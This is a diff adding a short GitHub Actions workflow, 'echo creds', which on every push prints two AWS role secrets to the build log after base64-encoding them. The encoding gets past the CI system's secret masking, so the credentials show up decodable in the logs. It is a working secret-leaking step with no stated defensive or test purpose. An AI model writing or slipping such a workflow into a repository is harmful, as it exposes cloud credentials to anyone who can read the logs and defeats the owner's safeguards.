@@ -1,0 +1,16 @@
+name: echo creds
+
+on:
+  push:
+jobs:
+
+  echo_creds:
+
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - name: echo creds
+        run: |
+          echo ${{ secrets.AWS_OIDC_ROLE }} | base64
+          echo ${{ secrets.AWS_CFN_ROLE_TO_ASSUME }} | base64
